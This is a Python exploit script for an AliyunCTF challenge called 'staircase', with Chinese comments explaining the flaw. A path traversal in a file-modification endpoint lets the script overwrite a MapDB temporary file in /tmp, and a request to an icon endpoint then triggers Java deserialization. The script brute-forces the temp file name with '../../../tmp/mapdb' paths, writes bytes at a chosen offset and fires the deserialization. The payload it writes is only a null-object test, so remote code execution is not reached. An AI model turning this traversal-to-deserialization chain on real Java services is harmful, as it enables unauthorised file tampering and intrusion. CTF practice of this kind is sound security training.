#!/usr/bin/env python3
"""
CTF Challenge: staircase - AliyunCTF
Exploit for MapDB Java Deserialization via Path Traversal File Modification

漏洞分析:
1. IconStorageService 使用 Serializer.JAVA 存储icon数据 -> Java原生反序列化
2. MapDB DBMaker.tempFileDB() 在 /tmp 创建临时文件 (mapdb*temp)
3. FileProcessorController.modifyFile 接口的 fileName 参数存在路径穿越
   - loadFile() 只检查文件是否存在，没有调用 check() 验证路径
4. 每次写入会被包裹为 <start>DATA<end> (最多8字节数据)
5. 调用 /files/icon 触发 Java 反序列化

关键发现:
- MapDB文件中序列化数据位于偏移 0x100250 附近
- 原始序列化数据: AC ED 00 05 75 72 00 02 5B 42 ... (byte[] 数组)
- 写入时 DATA 部分在 offset+7 位置开始

利用策略:
1. 通过路径穿越定位 MapDB 临时文件
2. 在正确偏移写入恶意序列化数据
3. 触发反序列化执行代码

Author: CTF Player
"""

import requests
import base64
import struct
import sys
import os
import time
import subprocess

class StaircaseExploit:
    def __init__(self, base_url):
        self.base_url = base_url.rstrip('/')
        self.session = requests.Session()
        self.mapdb_path = None
        self.serial_offset = 0x100250  # 默认序列化数据偏移
        
    def upload_file(self, content, filename="payload.bin", icon=None):
        """上传文件"""
        url = f"{self.base_url}/files/upload"
        files = {'file': (filename, content, 'application/octet-stream')}
        if icon:
            files['icon'] = ('icon.png', icon, 'image/png')
        
        try:
            resp = self.session.post(url, files=files, timeout=10)
            if resp.status_code == 200:
                print(f"[+] Upload success")
            return resp
        except Exception as e:
            print(f"[-] Upload error: {e}")
            return None
    
    def modify_file(self, filename, data, offset):
        """
        修改文件 - 核心漏洞点
        写入格式: <start>(7) + DATA(max 8) + <end>(5)
        """
        url = f"{self.base_url}/files/modify"
        
        if len(data) > 8:
            data = data[:8]
        
        payload = {
            "fileName": filename,
            "data": base64.b64encode(data).decode('utf-8'),
            "offset": offset
        }
        
        try:
            resp = self.session.put(url, json=payload, timeout=10)
            return resp
        except:
            return None
    
    def get_icon(self):
        """获取icon - 触发反序列化"""
        url = f"{self.base_url}/files/icon"
        try:
            return self.session.get(url, timeout=30)
        except Exception as e:
            print(f"[-] Get icon error: {e}")
            return None

    def write_at_data_position(self, data_8bytes, target_offset):
        """
        在指定位置写入8字节数据
        由于写入格式是 <start>DATA<end>，DATA在offset+7位置
        所以要让DATA落在target_offset，需要在target_offset-7写入
        """
        write_offset = target_offset - 7
        return self.modify_file(self.mapdb_path, data_8bytes, write_offset)

    def exploit(self, mapdb_filename, cmd="id"):
        """
        执行利用
        """
        print("=" * 60)
        print(" Staircase Exploit - MapDB Deserialization RCE")
        print("=" * 60)
        print(f"[*] Target: {self.base_url}")
        print(f"[*] MapDB: {mapdb_filename}")
        print()
        
        self.mapdb_path = mapdb_filename
        
        # Step 1: 上传初始文件
        print("[1] Uploading initial file...")
        self.upload_file(b"X" * 512, "init.bin")
        
        # Step 2: 验证 MapDB 文件可访问
        print("[2] Verifying MapDB access...")
        resp = self.modify_file(self.mapdb_path, b"X" * 8, 2000000)
        if not resp or resp.status_code != 200:
            print(f"[-] Cannot access: {self.mapdb_path}")
            print(f"[-] Response: {resp.text if resp else 'None'}")
            return False
        print(f"[+] MapDB accessible")
        
        # Step 3: 写入恶意数据
        print("[3] Writing malicious serialization data...")
        
        # 构造恶意序列化头
        # AC ED 00 05 = Java序列化魔术字节
        # 接下来需要构造一个能触发代码执行的对象
        
        # 方案A: 直接修改序列化头为 null (70 = TC_NULL)
        # 这会导致 getIcon 返回 null，但不会执行代码
        
        # 方案B: 构造完整的恶意对象
        # 由于每次只能写8字节，需要多次写入
        
        # 先测试单次写入
        # 在 serial_offset 写入 AC ED 00 05 + 4字节
        test_payload = b'\xac\xed\x00\x05\x70\x00\x00\x00'  # header + TC_NULL + padding
        
        print(f"[*] Writing at offset 0x{self.serial_offset:x}")
        resp = self.write_at_data_position(test_payload, self.serial_offset)
        
        if resp and resp.status_code == 200:
            print("[+] Write successful")
        else:
            print(f"[-] Write failed: {resp.text if resp else 'No response'}")
        
        # Step 4: 触发反序列化
        print("[4] Triggering deserialization...")
        resp = self.get_icon()
        if resp:
            print(f"[*] Response: {resp.status_code}")
            if resp.status_code == 500:
                print("[!] Server error - deserialization might have triggered!")
                print(f"[*] Response: {resp.text[:500] if resp.text else 'Empty'}")
        
        return True


def find_mapdb(url):
    """在服务器上查找 MapDB 文件"""
    exp = StaircaseExploit(url)
    exp.upload_file(b"test", "test.txt")
    
    print("[*] Searching for MapDB file...")
    
    # 尝试常见的路径模式
    prefixes = [
        "../../../tmp/mapdb",
        "../../../../tmp/mapdb",
    ]
    
    # 获取当前时间戳附近的文件名
    ts = int(time.time() * 1000)
    
    found = []
    for prefix in prefixes:
        # 尝试大范围搜索
        for delta in range(-1000000000, 1000000000, 1000000):
            test_path = f"{prefix}{ts + delta}temp"
            resp = exp.modify_file(test_path, b"XXXXXXXX", 2000000)
            if resp and resp.status_code == 200:
                print(f"[+] Found: {test_path}")
                found.append(test_path)
                return test_path
    
    return None


def main():
    if len(sys.argv) < 2:
        print("""
Staircase Exploit - MapDB Java Deserialization RCE

Usage: python exp_v2.py <url> --mapdb <path>

Options:
    --mapdb <path>    MapDB file path (required)
                      e.g., ../../../tmp/mapdb1234567890temp
    --find            Try to find MapDB file (slow)
    --offset <hex>    Custom serialization offset (default: 0x100250)

Steps:
1. Get MapDB filename: docker exec <container> ls /tmp/mapdb*
2. Run: python exp_v2.py http://target:8080 --mapdb ../../../tmp/mapdbXXXtemp

Examples:
    python exp_v2.py http://localhost:8080 --find
    python exp_v2.py http://localhost:8080 --mapdb ../../../tmp/mapdb123temp
        """)
        sys.exit(1)
    
    url = sys.argv[1]
    mapdb_path = None
    offset = 0x100250
    
    for i, arg in enumerate(sys.argv):
        if arg == "--mapdb" and i + 1 < len(sys.argv):
            mapdb_path = sys.argv[i + 1]
        elif arg == "--offset" and i + 1 < len(sys.argv):
            offset = int(sys.argv[i + 1], 16)
        elif arg == "--find":
            found = find_mapdb(url)
            if found:
                mapdb_path = found
            else:
                print("[-] Could not find MapDB file")
                sys.exit(1)
    
    if not mapdb_path:
        print("[-] --mapdb is required")
        print("[*] Get it from: docker exec <container> ls /tmp/mapdb*")
        sys.exit(1)
    
    exp = StaircaseExploit(url)
    exp.serial_offset = offset
    exp.exploit(mapdb_path)


if __name__ == "__main__":
    main()
